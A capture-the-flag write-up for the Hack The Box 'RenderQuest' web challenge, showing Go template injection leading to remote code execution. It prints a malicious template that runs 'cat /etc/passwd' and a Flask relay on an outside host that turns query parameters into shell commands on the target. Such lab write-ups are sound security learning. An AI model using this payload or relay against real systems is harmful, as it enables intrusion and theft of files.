# HTB-Challenges-Web-RenderQuest

## Challenge Description
You've found a website that lets you input remote templates for rendering. Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag. Good luck!

![localhost_1337_render_page=index tpl](https://github.com/patzj/HTB-Challenges-Web-RenderQuest/assets/10325457/34b7c072-9193-45bc-863f-accc84062311)

## Reconnaissance
At first glance, the application did not seem very intuitive to me. Furthermore, all the application codes were contained in a single file, making it quite intimidating. However, upon carefully reading the text within the application, I realized that the application could supply specific data to a given template. Once I grasped this concept, I understood how to exploit the application—specifically, through Remote Code Execution (RCE) via Server-Side Template Injection (SSTI).

While going through the code, two notable functions made it more evident that SSTI is the vulnerability to exploit. The first one is `FetchServerInfo`. This function strongly suggests RCE as it runs shell scripts. The other one is `isSubdirectory`, which makes it difficult, if not impossible, to perform directory traversal and gain access to the flag.

```go
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}
```

```
func isSubdirectory(basePath, path string) bool {
	rel, err := filepath.Rel(basePath, path)
	if err != nil {
		return false
	}
	return !strings.HasPrefix(rel, ".."+string(filepath.Separator))
}
```

The template engine used is `html/template`, with which I am not familiar. Consequently, I immediately turned to Google and conducted a search for "Golang html/template vulnerabilities", leading me to this insightful blog post: https://www.onsecurity.io/blog/go-ssti-method-research/. From there, I acquired knowledge on how to access the properties of the object supplied to the template. Additionally, I discovered that I can execute methods from the template using the following notation: `{{.MethodName "args"}}`.

Luckily for me, the object that gets supplied to the template is the one that can invoke `FetchServerInfo`. So the next thing to do is to test this concept.

## Scanning
Next, I need to show that I can make a simple example to prove I can run any code using a malicious template. I'm creating a file named `evil.tpl` and hosting it locally using `python3 -m http.server`. The template is now accessible on any interface at port 8000. As I'm utilizing Docker to test the application, I'm using the IP assigned to my Docker interface — http://172.28.80.1:8000/evil.tpl.

```tpl
<p>{{.ClientIP}}</p>
<p>{{.ClientUA}}</p>
<p>{{.FetchServerInfo "cat /etc/passwd"}}</p>
```

The following step involves entering the link to the "evil" template into the application's user input.

![localhost_1337_render_use_remote=true page=http___172 28 80 1_8000_evil tpl](https://github.com/patzj/HTB-Challenges-Web-RenderQuest/assets/10325457/342f376b-1095-4217-be01-49d1fa9c3505)

## Exploitation
Based on my prior experience with a different system, I held the belief that establishing a connection back to my local server might not be feasible. As a solution, I set up a Flask application on https://www.pythonanywhere.com/ designed to provide a template customized for accepting commands through query parameters. This allows me to issue any valid commands without the need to alter the server codes.

```py
from flask import Flask, Response, request

app = Flask(__name__)

@app.route('/')
def rce():
    cmd = request.args.get("cmd")
    payload = '{{.FetchServerInfo "' + cmd + '"}}'
    mimetype = 'application/vnd.groove-tool-template'
    return Response(payload, mimetype=mimetype)


# https://<user>.pythonanywhere.com/?cmd=<shell commands here>
```

Let's check the files in the current directory by using the application's form input: `https://<user>.pythonanywhere.com/?cmd=ls+.`.

![localhost_1337_render_use_remote=true page=https___user pythonanywhere com__cmd=ls+](https://github.com/patzj/HTB-Challenges-Web-RenderQuest/assets/10325457/8f8162e0-a07e-44de-a2ad-84fada2a47a0)

The flag isn't here, so let's navigate one level up: `https://<user>.pythonanywhere.com/?cmd=ls+..`.

![localhost_1337_render_use_remote=true page=https___user pythonanywhere com__cmd=ls+](https://github.com/patzj/HTB-Challenges-Web-RenderQuest/assets/10325457/f12b351e-4de6-4fb3-9af4-e8feba220bbf)

I've located the flag! It's important to mention that the flag name may differ, so exploring through the system is the key to finding it. Now, the final step is to reveal its content using `https://<user>.pythonanywhere.com/?cmd=cat+../flag7775f83d88.txt`.

![localhost_1337_render_use_remote=true page=https___user pythonanywhere com__cmd=cat+ _flag7775f83d88 txt](https://github.com/patzj/HTB-Challenges-Web-RenderQuest/assets/10325457/880d976e-09f8-4832-87fc-ff8bbc55ca4c)

Flag successfully captured!

## Post-Exploitation
While I didn't achieve a reverse shell, the capability to execute shell commands on the target system via query parameters is essentially a form of reverse shell. This poses a significant security risk, as malicious actors could exploit this functionality for various nefarious activities.

Despite my experience in Golang, the revelation of its native template engine is new to me. While I find it impressive, it becomes susceptible to security vulnerabilities, especially when the object passed to the template has methods that accept parameters. While this feature is interesting from a programming language perspective, I don't highly recommend its use due to the potential for abuse.
